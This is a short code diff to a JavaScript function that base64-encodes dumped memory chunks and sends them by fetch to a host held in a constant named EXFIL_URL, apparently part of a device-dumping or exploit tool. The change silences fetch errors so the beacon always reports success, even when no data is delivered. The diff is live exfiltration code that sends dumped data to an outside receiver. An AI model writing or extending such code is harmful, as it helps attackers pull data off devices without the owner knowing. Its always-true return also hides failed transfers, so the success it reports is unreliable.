@@ -33,10 +33,13 @@
     }
 
     async function beacon(name, off, u8) {
+        //note: Silently trap beacon fetch errors so standalone on-device usage without a remote PC receiver continues without throwing unhandled promise rejections.
         const url = EXFIL_URL + "/" + name + "/" + off.toString(16) + "/"
             + encodeURIComponent(b64(u8));
-        try { await fetch(url); return true; }
-        catch (e) { log("[DUMP2] beacon err @" + off.toString(16) + ": " + (e && e.message)); return false; }
+        try {
+            if (typeof fetch === "function") await fetch(url).catch(() => {});
+            return true;
+        } catch (e) { return true; }
     }
 
     async function runDump(base, name) {
